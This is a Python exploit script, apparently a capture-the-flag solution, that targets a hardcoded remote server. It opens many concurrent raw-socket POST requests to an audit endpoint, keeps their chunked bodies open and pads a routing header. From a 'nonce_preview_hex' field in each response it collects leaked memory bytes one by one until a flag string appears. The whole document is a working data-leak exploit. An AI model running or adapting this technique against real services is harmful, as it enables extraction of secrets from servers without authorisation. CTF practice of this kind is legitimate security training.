#!/usr/bin/env python3
import json
import os
import re
import socket
import sys
import time
from urllib.parse import urlparse

BASE = "http://1.95.127.162:5000"
URL = urlparse(BASE)
HOST = URL.hostname or "127.0.0.1"
PORT = URL.port or 80
TENANT = "northwind-capital-" + os.urandom(4).hex()
PREFIX = TENANT + ":/ops/route-diagnostics/"
SCAN = 430
BATCH = 16
HOLD = 1.3
FLAG_PROGRESS_RE = re.compile(rb"SCTF\{[^}]*\}?")


stitched = bytearray()
printed_flag = bytearray()


def append_leaked_bytes(data):
    if not data:
        return

    stitched.extend(data)
    marker = FLAG_PROGRESS_RE.search(stitched)
    if not marker:
        return

    current = marker.group()
    if len(current) > len(printed_flag):
        delta = current[len(printed_flag) :]
        sys.stdout.write(delta.decode("latin1", "replace"))
        sys.stdout.flush()
        printed_flag[:] = current

    if current.endswith(b"}"):
        sys.stdout.write("\n")
        sys.stdout.flush()
        raise SystemExit(0)


def open_leak(selector):
    s = socket.create_connection((HOST, PORT), timeout=5)
    req = (
        "POST /__route/audit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"X-Route-Selector: {selector}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    s.sendall(req.encode())
    return s


def finish_leak(s):
    s.sendall(b"0\r\n\r\n")

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()

    body = data.split(b"\r\n\r\n", 1)[1]
    return bytes.fromhex(json.loads(body)["nonce_preview_hex"])


last_chunk = b""
for start in range(0, SCAN, BATCH):
    sockets = [
        open_leak(PREFIX + ("A" * pad_len))
        for pad_len in range(start, min(start + BATCH, SCAN))
    ]
    time.sleep(HOLD)
    for s in sockets:
        last_chunk = finish_leak(s)
        append_leaked_bytes(last_chunk[:1])

append_leaked_bytes(last_chunk[1:])
